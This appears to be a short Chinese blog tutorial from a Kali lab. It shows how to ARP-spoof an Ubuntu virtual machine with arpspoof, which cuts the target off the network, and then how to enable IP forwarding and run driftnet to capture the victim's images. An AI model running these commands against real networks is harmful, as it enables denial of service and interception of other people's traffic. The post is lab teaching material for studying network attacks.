---
title: ARP攻击
date: 2016-07-14 16:50:30
tags:
- 计算机安全
- kali
---
> kali环境下arp攻击实例

开启两台虚拟机，分别是kali和ubuntu。两台虚拟机必须在同一网段。
ubuntu的ip: 192.168.99.162，网关为: 192.168.99.1
kali自带了arpspoof攻击，若得知对方ip和网关，以及使用的网卡。那么使用下面的命令，则可以使对方上不了网
```shell
arpspoof -i [网卡] -t [ip地址] [网关地址]
```
在kali中输入命令：```arpspoof -i etho 192.168.99.162 192.168.99.1```
成功的话，目标主机的流量都会经过攻击方主机的网卡。这些流量并不会被转发，所以目标主机断网。
![result](result.png)
若想进行arp欺骗，目标主机得正常上网。使用如下命令：```echo 1 > /proc/sys/net/ipv4/ip_forward```，攻击方可以将对方发来的流量转发给正确的网关。在kali中，输入以下命令```driftnet -i eth0```可以截获目标主机发来的图片。
![pictures](picture.png)